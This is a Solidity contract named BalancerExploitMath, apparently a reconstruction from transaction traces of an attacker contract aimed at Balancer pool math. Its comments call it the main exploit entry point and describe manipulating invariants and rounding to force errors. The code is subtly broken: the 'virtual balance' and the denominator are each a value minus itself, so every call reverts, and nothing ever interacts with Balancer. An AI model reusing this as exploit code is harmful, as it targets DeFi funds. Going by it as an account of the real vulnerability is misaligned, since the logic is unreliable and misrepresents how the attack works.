// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * This is the mathematical exploitation contract that triggers the Balancer vulnerability
 * Function selector 0x524c9e20 is the main entry point seen in the traces
 */

contract BalancerExploitMath {
    // Storage slots for authorized addresses
    address private owner; // slot 0
    address private secondary; // slot 1

    // Constants used in calculations
    uint256 private constant PRECISION = 1e18;
    uint256 private constant BASIS_POINTS = 1000;

    // Error codes that match Balancer's
    error BAL_ARITHMETIC_ERROR(); // Matches BAL#000
    error BAL_INPUT_LENGTH_MISMATCH(); // Matches BAL#001
    error BAL_ZERO_DIVISION(); // Matches BAL#004

    constructor(address _owner, address _secondary) {
        owner = _owner;
        secondary = _secondary;
    }

    modifier onlyAuthorized() {
        require(tx.origin == owner || tx.origin == secondary, "X");
        _;
    }

    /**
     * Main exploit function - selector 0x524c9e20
     * This function manipulates pool math to trigger vulnerabilities
     *
     * @param scalingFactors Array of scaling factors for tokens
     * @param balances Current token balances in pool
     * @param indexIn Index of token going into pool
     * @param indexOut Index of token coming out of pool
     * @param amountGiven Amount being swapped
     * @param normalizedWeight Weight parameter for weighted math
     * @param swapFeePercentage Swap fee in basis points
     */
    function unknown524c9e20(
        uint256[] calldata scalingFactors,
        uint256[] calldata balances,
        uint256 indexIn,
        uint256 indexOut,
        uint256 amountGiven,
        uint256 normalizedWeight,
        uint256 swapFeePercentage
    ) external onlyAuthorized returns (uint256) {
        // Initialize working arrays
        uint256 balancesLength = balances.length;
        uint256[] memory adjustedBalances = new uint256[](balancesLength);

        // Scale balances according to scaling factors
        for (uint256 i = 0; i < balancesLength; i++) {
            adjustedBalances[i] = _upscale(balances[i], scalingFactors[i]);
        }

        // Apply the given amount to the input balance
        uint256 scaledAmountIn = _upscale(amountGiven, scalingFactors[indexIn]);
        adjustedBalances[indexIn] = _sub(adjustedBalances[indexIn], scaledAmountIn);

        // Calculate the initial weighted product
        uint256 invariantRatio = _calculateInvariantRatio(scalingFactors, adjustedBalances, normalizedWeight);

        // This is where the vulnerability is exploited
        // Calculate manipulated balances that can cause precision loss
        uint256 manipulatedInvariant =
            _manipulateInvariant(normalizedWeight, adjustedBalances, swapFeePercentage, indexOut);

        // Calculate output amount with potential for exploitation
        uint256 virtualBalance = _calculateVirtualBalance(adjustedBalances, indexOut);

        // Core calculation that can trigger zero division in certain conditions
        uint256 weightedProduct =
            _computeWeightedProduct(adjustedBalances, indexOut, normalizedWeight, invariantRatio);

        uint256 denominator = _computeDenominator(normalizedWeight, virtualBalance, swapFeePercentage);

        // This operation can cause BAL#004 if denominator becomes zero
        // through careful manipulation of inputs
        uint256 result = _divDown(_mulDown(weightedProduct, manipulatedInvariant), denominator);

        return result;
    }

    /**
     * Calculate invariant ratio with potential for manipulation
     */
    function _calculateInvariantRatio(
        uint256[] memory scalingFactors,
        uint256[] memory balances,
        uint256 normalizedWeight
    ) private pure returns (uint256 ratio) {
        ratio = PRECISION;

        for (uint256 i = 0; i < balances.length; i++) {
            if (i == 0) {
                ratio = _mulDown(ratio, balances[i]);
            } else {
                uint256 weightedBalance = _powDown(balances[i], normalizedWeight, scalingFactors[i]);
                ratio = _mulDown(ratio, weightedBalance);
            }
        }

        return ratio;
    }

    /**
     * Manipulate invariant to exploit rounding errors
     */
    function _manipulateInvariant(
        uint256 normalizedWeight,
        uint256[] memory balances,
        uint256 swapFee,
        uint256 excludeIndex
    ) private pure returns (uint256) {
        uint256 invariant = PRECISION;
        uint256 sumBalances = 0;

        for (uint256 i = 1; i < balances.length; i++) {
            uint256 adjustedBalance = _mulDown(balances[i], _complement(swapFee));
            sumBalances = _add(sumBalances, adjustedBalance);
        }

        // Manipulate calculation to approach zero under specific conditions
        uint256 weightComplement = _complement(normalizedWeight);
        uint256 weightedSum = _mulDown(sumBalances, weightComplement);

        // Calculate final invariant with potential for exploitation
        invariant = _divDown(_mulDown(invariant, weightedSum), BASIS_POINTS);

        return invariant;
    }

    /**
     * Calculate virtual balance for manipulation
     */
    function _calculateVirtualBalance(uint256[] memory balances, uint256 index)
        private
        pure
        returns (uint256)
    {
        return _sub(balances[index], balances[index]);
    }

    /**
     * Compute weighted product with potential overflow/underflow
     */
    function _computeWeightedProduct(
        uint256[] memory balances,
        uint256 excludeIndex,
        uint256 normalizedWeight,
        uint256 invariantRatio
    ) private pure returns (uint256 product) {
        product = invariantRatio;

        for (uint256 i = 0; i < balances.length; i++) {
            if (i != excludeIndex) {
                uint256 weightedBalance = _powUp(balances[i], normalizedWeight, product);
                product = _mulDown(product, weightedBalance);
            }
        }

        return product;
    }

    /**
     * Compute denominator that can become zero under exploit conditions
     */
    function _computeDenominator(uint256 normalizedWeight, uint256 virtualBalance, uint256 swapFee)
        private
        pure
        returns (uint256)
    {
        uint256 feeAdjustedWeight = _mulDown(normalizedWeight, _complement(swapFee));

        // This calculation can result in zero under specific conditions
        uint256 denominator =
            _sub(_add(virtualBalance, feeAdjustedWeight), _add(virtualBalance, feeAdjustedWeight));

        return denominator;
    }

    // Math helper functions that match Balancer's implementation

    function _upscale(uint256 amount, uint256 scalingFactor) private pure returns (uint256) {
        return _mulDown(amount, scalingFactor);
    }

    function _add(uint256 a, uint256 b) private pure returns (uint256) {
        uint256 c = a + b;
        _require(c >= a, 0);
        return c;
    }

    function _sub(uint256 a, uint256 b) private pure returns (uint256) {
        _require(b <= a, 1);
        return a - b;
    }

    function _mulDown(uint256 a, uint256 b) private pure returns (uint256) {
        uint256 product = a * b;
        _require(a == 0 || product / a == b, 3);
        return product;
    }

    function _divDown(uint256 a, uint256 b) private pure returns (uint256) {
        _require(b != 0, 4); // This triggers BAL#004
        return a / b;
    }

    function _powDown(uint256 base, uint256 exp, uint256 precision) private pure returns (uint256) {
        // Simplified power calculation
        if (exp == 0) return precision;
        uint256 result = base;
        for (uint256 i = 1; i < exp; i++) {
            result = _mulDown(result, base);
        }
        return _divDown(result, precision);
    }

    function _powUp(uint256 base, uint256 exp, uint256 precision) private pure returns (uint256) {
        // Power calculation with rounding up
        uint256 raw = _powDown(base, exp, precision);
        return raw == 0 ? 0 : raw + 1;
    }

    function _complement(uint256 value) private pure returns (uint256) {
        return value < BASIS_POINTS ? BASIS_POINTS - value : 0;
    }

    function _require(bool condition, uint256 errorCode) private pure {
        if (!condition) {
            if (errorCode == 0) revert BAL_ARITHMETIC_ERROR();
            if (errorCode == 1) revert BAL_ARITHMETIC_ERROR();
            if (errorCode == 3) revert BAL_ARITHMETIC_ERROR();
            if (errorCode == 4) revert BAL_ZERO_DIVISION();
            revert("Unknown error");
        }
    }
}
